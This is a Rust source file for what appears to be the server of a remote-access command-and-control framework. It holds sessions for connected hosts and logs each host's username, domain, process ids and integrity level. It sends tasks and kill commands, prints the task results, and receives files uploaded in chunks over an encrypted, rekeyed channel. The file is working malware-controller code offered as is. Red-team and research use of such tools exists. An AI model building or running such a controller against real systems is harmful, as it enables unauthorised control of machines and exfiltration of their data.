use std::collections::HashMap;
use std::fs::File;
use std::io::{BufReader, ErrorKind};
use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::{anyhow, Context, Result};
use crisper_proto::{
    derive_keys,
    frame::{Frame, MsgType, ReplayWindow, HEADER_LEN, MAX_BODY},
    handshake::{info, rekey_salt, salt, transcript, Hello, HelloAck, HELLO_LEN},
    hmac_sha256, msg, Ephemeral, SessionKeys,
};
use sha2::{Digest, Sha256};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, watch, Mutex};
use tokio_rustls::TlsAcceptor;
use x25519_dalek::PublicKey;

use crate::config::Config;
use crate::db::Db;
use crate::session::{Outbound, SessionHandle, SessionInfo};

pub struct State {
    pub cfg: Config,
    pub psk: Vec<u8>,
    pub db: Db,
    pub sessions: Mutex<HashMap<u64, Arc<SessionHandle>>>,
    pub next_session: AtomicU64,
    pub next_task: AtomicU64,
}

impl State {
    pub fn new(cfg: Config, db: Db) -> Result<Arc<Self>> {
        let psk = cfg.psk()?;
        Ok(Arc::new(Self {
            cfg,
            psk,
            db,
            sessions: Mutex::new(HashMap::new()),
            next_session: AtomicU64::new(1),
            next_task: AtomicU64::new(1),
        }))
    }
}

fn now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn tls_acceptor(cfg: &Config) -> Result<TlsAcceptor> {
    let certs = rustls_pemfile::certs(&mut BufReader::new(File::open(&cfg.tls_cert)?))
        .collect::<Result<Vec<_>, _>>()
        .context("load certificate chain")?;
    let key = rustls_pemfile::private_key(&mut BufReader::new(File::open(&cfg.tls_key)?))
        .context("load private key")?
        .ok_or_else(|| anyhow!("no private key in {}", cfg.tls_key.display()))?;
    let server = rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(certs, key)
        .context("build tls config")?;
    Ok(TlsAcceptor::from(Arc::new(server)))
}

pub async fn run(state: Arc<State>, mut shutdown: watch::Receiver<bool>) -> Result<()> {
    let acceptor = tls_acceptor(&state.cfg)?;
    let listener = TcpListener::bind(state.cfg.bind).await?;
    println!("[*] listening on {}", state.cfg.bind);

    loop {
        tokio::select! {
            changed = shutdown.changed() => {
                if changed.is_err() || *shutdown.borrow() {
                    break;
                }
            }
            accepted = listener.accept() => {
                let (sock, peer) = accepted?;
                let acceptor = acceptor.clone();
                let state = state.clone();
                tokio::spawn(async move {
                    if let Err(e) = handle(sock, acceptor, state, peer).await {
                        println!("[-] {peer}: {e:#}");
                    }
                });
            }
        }
    }

    let mut sessions = state.sessions.lock().await;
    for (_, handle) in sessions.drain() {
        handle.kill();
    }
    Ok(())
}

async fn handle(sock: TcpStream, acceptor: TlsAcceptor, state: Arc<State>, peer: SocketAddr) -> Result<()> {
    sock.set_nodelay(true).ok();
    let mut tls = acceptor.accept(sock).await?;

    let mut hello_buf = [0u8; HELLO_LEN];
    tls.read_exact(&mut hello_buf).await?;
    let hello = Hello::decode(&hello_buf)?;

    let eph = Ephemeral::generate();
    let ack_nonce: [u8; 16] = rand::random();
    let gcm_nonce: [u8; 12] = rand::random();
    let mut ack = HelloAck {
        public: eph.public.to_bytes(),
        nonce: ack_nonce,
        gcm_nonce,
        mac: [0; 32],
    };
    let tag = hmac_sha256(&state.psk, &transcript(&hello_buf, &ack));
    ack.mac.copy_from_slice(&tag);
    tls.write_all(&ack.encode()).await?;

    let shared = eph.diffie_hellman(&hello.public);
    let keys = derive_keys(&shared, &salt(&hello.nonce, &ack_nonce), &info(&gcm_nonce))?;

    let id = state.next_session.fetch_add(1, Ordering::SeqCst);
    let (tx, rx) = mpsc::channel::<Outbound>(64);
    let next_tx = Arc::new(std::sync::atomic::AtomicU32::new(0));
    let handle = Arc::new(SessionHandle {
        id,
        info: std::sync::Mutex::new(SessionInfo {
            peer: peer.to_string(),
            connected_at: now(),
            ..Default::default()
        }),
        tx,
        next_tx: next_tx.clone(),
        secret: eph.secret().clone(),
    });

    state.db.open_session(id, &peer.to_string(), now())?;
    state.db.audit("server", "session_open", &peer.to_string(), now())?;
    state.sessions.lock().await.insert(id, handle.clone());
    println!("[+] session {id} connected from {peer}");

    let (mut rd, wr) = tokio::io::split(tls);
    let writer_keys = Arc::new(std::sync::Mutex::new(keys.clone()));
    let writer = tokio::spawn(writer_loop(rx, wr, writer_keys.clone(), next_tx));

    let result = reader_loop(&mut rd, &state, &handle, keys, writer_keys).await;

    handle.kill();
    let _ = writer.await;
    state.sessions.lock().await.remove(&id);
    state.db.close_session(id, now()).ok();
    state.db.audit("server", "session_close", &peer.to_string(), now()).ok();
    println!("[-] session {id} closed");

    result
}

async fn writer_loop<W: AsyncWrite + Unpin>(
    mut rx: mpsc::Receiver<Outbound>,
    mut wr: W,
    keys: Arc<std::sync::Mutex<SessionKeys>>,
    next_tx: Arc<std::sync::atomic::AtomicU32>,
) {
    while let Some(item) = rx.recv().await {
        let mut stop = false;
        let (typ, flags, body) = match item {
            Outbound::Task(task) => match msg::encode(&task) {
                Ok(b) => (MsgType::Task, 0u8, b),
                Err(_) => continue,
            },
            Outbound::Send(t, b) => (t, 0u8, b),
            Outbound::Ping(ts) => match msg::encode(&msg::Ping { ts }) {
                Ok(b) => (MsgType::Ping, 0u8, b),
                Err(_) => continue,
            },
            Outbound::Kill => {
                stop = true;
                (MsgType::Kill, 0u8, Vec::new())
            }
            Outbound::SetKeys(next) => {
                *keys.lock().unwrap() = next;
                continue;
            }
        };
        let seq = next_tx.fetch_add(1, Ordering::SeqCst);
        let key = keys.lock().unwrap().s2c;
        let Ok(bytes) = Frame::encode(&key, seq, typ, flags, &body) else { break };
        if wr.write_all(&bytes).await.is_err() {
            break;
        }
        if wr.flush().await.is_err() {
            break;
        }
        if stop {
            break;
        }
    }
}

async fn read_frame<R: AsyncRead + Unpin>(
    rd: &mut R,
    key: &[u8; 32],
    window: &mut ReplayWindow,
) -> Result<Option<Frame>> {
    let mut header = [0u8; HEADER_LEN];
    match rd.read_exact(&mut header).await {
        Ok(_) => {}
        Err(e) if e.kind() == ErrorKind::UnexpectedEof => return Ok(None),
        Err(e) => return Err(e.into()),
    }
    let ct_len = u32::from_be_bytes([header[6], header[7], header[8], header[9]]) as usize;
    if ct_len == 0 || ct_len > MAX_BODY {
        return Err(anyhow!("bad frame length {ct_len}"));
    }
    let mut body = vec![0u8; ct_len];
    rd.read_exact(&mut body).await?;

    let mut full = Vec::with_capacity(HEADER_LEN + ct_len);
    full.extend_from_slice(&header);
    full.extend_from_slice(&body);

    let (frame, _) = Frame::decode(key, &full)?;
    window.accept(frame.seq)?;
    Ok(Some(frame))
}

async fn reader_loop<R: AsyncRead + Unpin>(
    rd: &mut R,
    state: &Arc<State>,
    handle: &Arc<SessionHandle>,
    mut keys: SessionKeys,
    writer_keys: Arc<std::sync::Mutex<SessionKeys>>,
) -> Result<()> {
    let mut window = ReplayWindow::default();

    loop {
        let Some(frame) = read_frame(rd, &keys.c2s, &mut window).await? else {
            return Ok(());
        };

        match frame.typ {
            MsgType::Checkin => {
                let c: msg::Checkin = msg::decode(&frame.body)?;
                {
                    let mut info = handle.info.lock().unwrap();
                    info.hostname = c.hostname.clone();
                    info.username = c.username.clone();
                    info.keyfp = c.keyfp.clone();
                }
                state.db.identify_session(handle.id, &c.hostname, &c.username, &c.keyfp)?;
                println!(
                    "[i] session {} -> {}@{}\\{} pid={} ppid={} build={} integ={}",
                    handle.id, c.username, c.hostname, c.domain, c.pid, c.ppid, c.os_build, c.integrity
                );
            }
            MsgType::TaskResult => {
                let r: msg::TaskResult = msg::decode(&frame.body)?;
                if r.done {
                    state.db.finish_task(handle.id, r.id, r.status, now())?;
                }
                println!("[{} task {} status {}]\n{}", handle.id, r.id, r.status, String::from_utf8_lossy(&r.data));
            }
            MsgType::Pong => {
                let p: msg::Pong = msg::decode(&frame.body)?;
                println!("[{}] pong {}", handle.id, p.ts);
            }
            MsgType::Ping => {
                let p: msg::Ping = msg::decode(&frame.body)?;
                if let Ok(body) = msg::encode(&msg::Pong { ts: p.ts }) {
                    handle.send(MsgType::Pong, body);
                }
            }
            MsgType::FileChunk => {
                let chunk: msg::FileChunk = msg::decode(&frame.body)?;
                let digest: [u8; 32] = Sha256::digest(&chunk.data).into();
                if digest != chunk.sha256 {
                    let err = msg::ErrorBody { code: 0x0101, message: "chunk digest mismatch".into() };
                    if let Ok(body) = msg::encode(&err) {
                        handle.send(MsgType::Error, body);
                    }
                    continue;
                }
                let dir = state.cfg.files_dir.join(handle.id.to_string());
                std::fs::create_dir_all(&dir)?;
                let path = dir.join(format!("{}.bin", chunk.xfer));
                {
                    use std::io::{Seek, SeekFrom, Write};
                    let mut file = std::fs::OpenOptions::new().create(true).read(true).write(true).open(&path)?;
                    file.seek(SeekFrom::Start(chunk.offset))?;
                    file.write_all(&chunk.data)?;
                }
                let ack = msg::FileAck { xfer: chunk.xfer, next: chunk.offset + chunk.data.len() as u64 };
                if let Ok(body) = msg::encode(&ack) {
                    handle.send(MsgType::FileAck, body);
                }
            }
            MsgType::Rekey => {
                let r: msg::Rekey = msg::decode(&frame.body)?;
                let peer_key = PublicKey::from(r.public);
                let shared = handle.secret.diffie_hellman(&peer_key);
                let server_pub = PublicKey::from(&handle.secret).to_bytes();
                let fresh = derive_keys(&shared, &rekey_salt(&r.public, &server_pub), b"crisper-v1-rekey")?;
                keys = fresh.clone();
                if handle.tx.try_send(Outbound::SetKeys(fresh)).is_err() {
                    return Ok(());
                }
            }
            MsgType::Error => {
                let e: msg::ErrorBody = msg::decode(&frame.body)?;
                println!("[{}] remote error {}: {}", handle.id, e.code, e.message);
            }
            MsgType::Kill => return Ok(()),
            other => println!("[{}] unhandled frame {:?}", handle.id, other),
        }
    }
}
